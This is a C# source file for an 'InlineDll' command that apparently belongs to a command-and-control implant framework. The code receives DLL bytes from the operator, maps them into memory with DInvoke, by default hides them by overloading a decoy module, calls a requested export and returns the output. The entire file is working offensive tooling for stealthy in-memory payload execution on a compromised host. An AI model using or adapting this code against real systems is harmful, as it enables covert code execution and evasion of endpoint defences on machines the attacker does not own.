using System;
using System.Threading.Tasks;
using DynamicEngLoading;


namespace Engineer.Commands
{
    internal class InlineDll : EngineerCommand
    {
        public override string Name => "InlineDll";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                if (task.File.Length < 1)
                {
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Error: /dll argument not found, please include the path to the dll to load, it should be present on the ts",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                    return;
                }
                if (!task.Arguments.TryGetValue("/function", out string export))
                {
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Error: /function argument not found, this is the exported function of the dll to call",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                    return;
                }
                task.Arguments.TryGetValue("/args", out string args);
                args = args.TrimStart(' ');
                export = export.TrimStart(' ');

                byte[] dllBytes = task.File;
                //Console.WriteLine($"got {dllBytes.Length} bytes");

                //uses dinvoke to map and load any dll, and execute desired functions.
                // find a decoy
                if (task.Arguments.TryGetValue("/nodecoy",out string _))
                {

                    var map =  DynInv.MapModuleToMemory(dllBytes);
                    object[] parameters = new object[] { args };
                    // run
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"executing dll\n", task, EngTaskStatus.Running, TaskResponseType.String);
                    //Console.WriteLine("executing dll");
                    var result = (string)DynInv.CallMappedDLLModuleExport(map.PEINFO, map.ModuleBase, export, typeof(h_DynInv.CUSTOM_DELEGATES.GenericDelegate), parameters);
                    // return output
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(result, task, EngTaskStatus.Complete, TaskResponseType.String);
                }
                else
                {
                    var decoy = DynInv.FindDecoyModule(dllBytes.Length);

                    if (string.IsNullOrWhiteSpace(decoy))
                    {
                        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Error: No suitable decoy found\n", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                        return;
                    }
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"found decoy to overload module\n", task, EngTaskStatus.Running, TaskResponseType.String);
                    //Console.WriteLine("found decoy trying to overload module");
                    // map the module
                    var map = DynInv.OverloadModule(dllBytes, decoy);
                    //Console.WriteLine("module overloaded");
                    object[] parameters = new object[] { args };

                    // run
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"executing dll\n", task, EngTaskStatus.Running, TaskResponseType.String);
                    //Console.WriteLine("executing dll");
                    var result = (string)DynInv.CallMappedDLLModuleExport(map.PEINFO, map.ModuleBase, export, typeof(h_DynInv.CUSTOM_DELEGATES.GenericDelegate), parameters);

                    // return output
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(result, task, EngTaskStatus.Complete, TaskResponseType.String);
                }
            }
            catch (Exception ex)
            {
                //Console.WriteLine(ex.Message);
                //Console.WriteLine(ex.StackTrace);
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(ex.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
            }
        }
    }
}
